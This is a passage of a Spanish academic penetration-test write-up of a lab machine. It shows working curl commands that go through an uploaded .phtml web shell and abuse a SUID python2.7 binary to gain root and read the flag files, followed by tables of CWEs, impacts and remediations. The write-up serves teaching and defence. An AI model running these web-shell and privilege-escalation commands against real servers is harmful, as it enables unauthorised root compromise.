
Un intérprete Python con el bit SUID activo, propiedad de `root`, permite ejecutar código arbitrario con privilegios de root, dado que Python no abandona los privilegios efectivos al iniciar.

**Evidencia:** `evidencias/privesc/01-suid-enumeration.png`

#### Explotación del SUID

```bash
curl -s "http://<IP>/uploads/cmd.phtml?cmd=python2.7+-c+%22import+os%3Bos.setuid(0)%3Bos.system('id')%22"
# → uid=0(root) gid=33(www-data) groups=33(www-data)
```

Confirmada ejecución de comandos como `root`.

**Evidencia:** `evidencias/privesc/02-privesc-root-confirmado.png`

### Obtención de flags

```bash
# user.txt
curl -s "http://<IP>/uploads/cmd.phtml?cmd=cat+/var/www/user.txt"

# root.txt
curl -s "http://<IP>/uploads/cmd.phtml?cmd=python2.7+-c+%22import+os%3Bos.setuid(0)%3Bos.system('cat+/root/root.txt')%22"
```

Ambas flags fueron obtenidas y validadas en la plataforma (ver captura de progreso 100%, flags no publicadas por política de la actividad).

**Evidencia:** `evidencias/99-room-completed-100.png`

## Vulnerabilidades encontradas y su impacto

| # | Vulnerabilidad | CWE | Impacto en entorno real |
|---|---|---|---|
| 1 | Subida de archivos con blacklist incompleta | CWE-434 | Ejecución remota de código (RCE) sin autenticación, compromiso total del servidor web |
| 2 | Listado de directorios habilitado en `/uploads/` | CWE-548 | Facilita el descubrimiento de archivos subidos por un atacante o de terceros |
| 3 | Binario SUID innecesario (`python2.7`) | CWE-250 / CWE-269 | Escalada de privilegios local trivial desde cualquier usuario con shell en el sistema, incluyendo un proceso web comprometido |

La combinación de las vulnerabilidades 1 y 3 permite a un atacante no autenticado pasar de **ningún acceso** a **control total de root** en la máquina, con solo dos peticiones HTTP.

## Remediaciones recomendadas

| Vulnerabilidad | Remediación |
|---|---|
| Subida de archivos sin validación real | Validar el tipo MIME real del archivo (no solo la extensión), usar listas blancas estrictas de extensiones permitidas, y almacenar los archivos subidos fuera del webroot o en un directorio sin permiso de ejecución de scripts (`php_admin_flag engine off`) |
| Extensiones alternativas ejecutables por Apache | Configurar explícitamente `mod_mime`/`mod_php` para no asociar `.phtml`, `.php5`, `.php7`, `.pht`, `.phar` al manejador de PHP, o deshabilitar dichos handlers si no son necesarios |
| Listado de directorios habilitado | Deshabilitar `Options +Indexes` en la configuración de Apache para el directorio `/uploads/` |
| Binario SUID innecesario | Aplicar el principio de mínimo privilegio: eliminar el bit SUID de `/usr/bin/python2.7` (`chmod u-s`) salvo que exista una necesidad operativa explícita y documentada; de requerirse elevación puntual, usar `sudo` con reglas específicas en `/etc/sudoers` en lugar de SUID directo sobre el intérprete |
| Servicio web ejecutándose sin aislamiento | Ejecutar Apache/PHP en un contenedor o entorno con privilegios reducidos, evitando que un RCE en la aplicación web facilite el acceso directo a binarios SUID del sistema base |

## Conclusiones y aprendizajes

- La validación de subida de archivos basada únicamente en la extensión declarada es insuficiente: cualquier blacklist incompleta puede ser evadida con extensiones alternativas que el servidor web también interpreta como código ejecutable.
- Un RCE obtenido en un proceso de bajo privilegio (`www-data`) puede derivar en compromiso total del sistema si existen binarios SUID mal configurados, sin necesidad de explotar vulnerabilidades adicionales del kernel o del propio Apache.
- Confirmar la ejecución real (no solo la subida exitosa) de un archivo cargado es un paso crítico antes de intentar técnicas más invasivas como una reverse shell — en este caso permitió avanzar igualmente pese a que la conexión saliente estaba bloqueada.
- Documentar cada paso con evidencia reproducible (comandos exactos + capturas) es tan importante como la explotación en sí para un informe técnico profesional.

---

*Informe elaborado como actividad académica. Flags omitidas del contenido público por política de la actividad; su obtención queda acreditada mediante las evidencias incluidas.*
